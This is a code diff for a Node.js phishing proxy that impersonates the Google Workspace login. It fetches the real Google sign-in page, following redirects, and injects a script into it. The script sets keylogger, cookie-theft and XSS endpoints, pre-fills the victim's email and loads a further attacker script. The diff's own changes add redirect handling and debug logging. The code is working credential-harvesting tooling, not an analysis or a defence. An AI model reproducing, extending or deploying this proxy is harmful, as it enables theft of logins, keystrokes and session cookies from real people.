@@ -250,7 +250,6 @@ function serveFile(filename, res, contentType = 'text/html') {
     fs.readFile(filePath, (err, data) => {
         if (err) {
             console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
-            // ✅ Serve 404 page instead of generic error
             serve404Page(res);
             return;
         }
@@ -263,14 +262,13 @@ function serveFile(filename, res, contentType = 'text/html') {
 }
 
 // ============================================================
-//  ✅ NEW: 404 Page Handler
+//  404 Page Handler
 // ============================================================
 
 function serve404Page(res) {
     const filePath = path.join(__dirname, '404_not_found.html');
     fs.readFile(filePath, (err, data) => {
         if (err) {
-            // Fallback if 404_not_found.html doesn't exist
             res.writeHead(404, { 'Content-Type': 'text/html' });
             res.end(`
                 <!DOCTYPE html>
@@ -406,17 +404,17 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  ✅ ENHANCED HANDLE LOGIN REQUEST - Google Workspace
+//  ✅ ENHANCED HANDLE LOGIN REQUEST - WITH FULL DEBUGGING
 // ============================================================
 
 function handleLoginRequest(req, res) {
     console.log(`[LOGIN] 🔐 Request received: ${req.url}`);
-    
+
     const emailParam = req.url.match(/login_hint=([^&]+)/);
     const email = emailParam ? decodeURIComponent(emailParam[1]) : '';
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
-    
+
     if (!email) {
         console.warn('[LOGIN] ⚠️ No email provided, redirecting to Google');
         res.writeHead(302, { 'Location': 'https://accounts.google.com/ServiceLogin' });
@@ -445,83 +443,120 @@ function handleLoginRequest(req, res) {
 
     console.log(`[LOGIN] 🔗 Fetching: ${targetUrl}`);
 
-    https.get(targetUrl, {
-        headers: {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Cache-Control': 'no-cache'
+    // ✅ Recursive function to handle redirects
+    function fetchUrl(url, redirectCount = 0) {
+        if (redirectCount > 5) {
+            console.error('[LOGIN] ❌ Too many redirects');
+            res.writeHead(500);
+            res.end('Too many redirects');
+            return;
         }
-    }, (targetRes) => {
-        console.log(`[LOGIN] 📥 Response status: ${targetRes.statusCode}`);
-        
-        let data = [];
-        targetRes.on('data', chunk => data.push(chunk));
-        targetRes.on('end', () => {
-            let body = Buffer.concat(data).toString();
-            console.log(`[LOGIN] 📄 Body length: ${body.length}`);
-            
-            // ✅ Inject script with email pre-filled
-            const injectionScript = `
-            <script>
-                console.log('🔐 Google Proxy loaded');
-                window.GOOGLE_CONFIG = {
-                    BACKEND_URL: '${BACKEND_URL}',
-                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
-                    XSS_ENDPOINT: '${PATHS.xssEndpoint}',
-                    COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
-                    KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
-                    SESSION_ID: '${sessionId}',
-                    EMAIL: '${email}',
-                    SERVICE: 'Google Workspace'
-                };
-                console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
-                console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
+
+        https.get(url, {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Cache-Control': 'no-cache'
+            }
+        }, (targetRes) => {
+            console.log(`[LOGIN] 📥 Response status: ${targetRes.statusCode}`);
+            console.log(`[LOGIN] 📄 Response Headers: ${JSON.stringify(targetRes.headers)}`);
+
+            // ✅ Handle redirects
+            if (targetRes.statusCode === 301 || targetRes.statusCode === 302 || targetRes.statusCode === 303) {
+                const redirectUrl = targetRes.headers.location;
+                console.log(`[LOGIN] 🔄 Redirecting to: ${redirectUrl}`);
+                fetchUrl(redirectUrl, redirectCount + 1);
+                return;
+            }
+
+            let data = [];
+            targetRes.on('data', chunk => data.push(chunk));
+            targetRes.on('end', () => {
+                let body = Buffer.concat(data).toString();
                 
-                // Auto-fill email on page load
-                document.addEventListener('DOMContentLoaded', function() {
-                    const email = '${email}';
-                    const emailField = document.querySelector('input[name="Email"]') || 
-                                      document.querySelector('input[type="email"]') ||
-                                      document.querySelector('input[name="identifier"]') ||
-                                      document.querySelector('#identifierId');
-                    if (emailField) {
-                        emailField.value = email;
-                        const event = new Event('input', { bubbles: true });
-                        emailField.dispatchEvent(event);
-                        console.log('✅ Auto-filled email:', email);
-                    } else {
-                        console.log('⚠️ Email field not found, retrying...');
-                        setTimeout(function() {
-                            const retryField = document.querySelector('input[name="Email"]') || 
-                                               document.querySelector('input[type="email"]');
-                            if (retryField) {
-                                retryField.value = email;
-                                const event = new Event('input', { bubbles: true });
-                                retryField.dispatchEvent(event);
-                                console.log('✅ Auto-filled email (retry):', email);
-                            }
-                        }, 1000);
-                    }
+                // --- ✅ FULL DEBUG LOGGING ---
+                console.log(`[LOGIN] 📄 Body length: ${body.length}`);
+                console.log(`[LOGIN] 📄 Body Preview (first 500 chars): ${body.substring(0, 500)}`);
+                if (body.length < 100) {
+                    console.log(`[LOGIN] ⚠️ WARNING: Response body is very small (${body.length} chars). Possible redirect or error.`);
+                    console.log(`[LOGIN] 📄 Full body: ${body}`);
+                }
+                // --- END DEBUG LOGGING ---
+
+                // ✅ Check if response is HTML or error
+                if (body.includes('Gmail') || body.includes('accounts.google.com')) {
+                    console.log('[LOGIN] ✅ Valid Google login page received');
+                } else if (body.includes('error') || body.includes('denied') || body.includes('blocked')) {
+                    console.log('[LOGIN] ⚠️ Error detected in response');
+                }
+
+                // ✅ Inject script with email pre-filled
+                const injectionScript = `
+                <script>
+                    console.log('🔐 Google Proxy loaded');
+                    window.GOOGLE_CONFIG = {
+                        BACKEND_URL: '${BACKEND_URL}',
+                        KEYLOGGER_URL: '${KEYLOGGER_URL}',
+                        XSS_ENDPOINT: '${PATHS.xssEndpoint}',
+                        COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
+                        KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
+                        SESSION_ID: '${sessionId}',
+                        EMAIL: '${email}',
+                        SERVICE: 'Google Workspace'
+                    };
+                    console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
+                    console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
+                    
+                    // Auto-fill email on page load
+                    document.addEventListener('DOMContentLoaded', function() {
+                        const email = '${email}';
+                        const emailField = document.querySelector('input[name="Email"]') || 
+                                          document.querySelector('input[type="email"]') ||
+                                          document.querySelector('input[name="identifier"]') ||
+                                          document.querySelector('#identifierId');
+                        if (emailField) {
+                            emailField.value = email;
+                            const event = new Event('input', { bubbles: true });
+                            emailField.dispatchEvent(event);
+                            console.log('✅ Auto-filled email:', email);
+                        } else {
+                            console.log('⚠️ Email field not found, retrying...');
+                            setTimeout(function() {
+                                const retryField = document.querySelector('input[name="Email"]') || 
+                                                   document.querySelector('input[type="email"]');
+                                if (retryField) {
+                                    retryField.value = email;
+                                    const event = new Event('input', { bubbles: true });
+                                    retryField.dispatchEvent(event);
+                                    console.log('✅ Auto-filled email (retry):', email);
+                                }
+                            }, 1000);
+                        }
+                    });
+                </script>
+                <script src="${PATHS.script}"></script>
+                `;
+                
+                body = body.replace(/<\/body>/i, injectionScript + '</body>');
+                
+                res.writeHead(200, {
+                    'Content-Type': 'text/html',
+                    'Cache-Control': 'no-store, no-cache, must-revalidate'
                 });
-            </script>
-            <script src="${PATHS.script}"></script>
-            `;
-            
-            body = body.replace(/<\/body>/i, injectionScript + '</body>');
-            
-            res.writeHead(200, {
-                'Content-Type': 'text/html',
-                'Cache-Control': 'no-store, no-cache, must-revalidate'
+                res.end(body);
+                console.log('[LOGIN] ✅ Response sent to client');
             });
-            res.end(body);
+        }).on('error', (err) => {
+            console.error(`[LOGIN] ❌ Error: ${err.message}`);
+            res.writeHead(302, { 'Location': targetUrl });
+            res.end();
         });
-    }).on('error', (err) => {
-        console.error(`[LOGIN] ❌ Error: ${err.message}`);
-        res.writeHead(302, { 'Location': targetUrl });
-        res.end();
-    });
+    }
+
+    fetchUrl(targetUrl);
 }
 
 // ============================================================
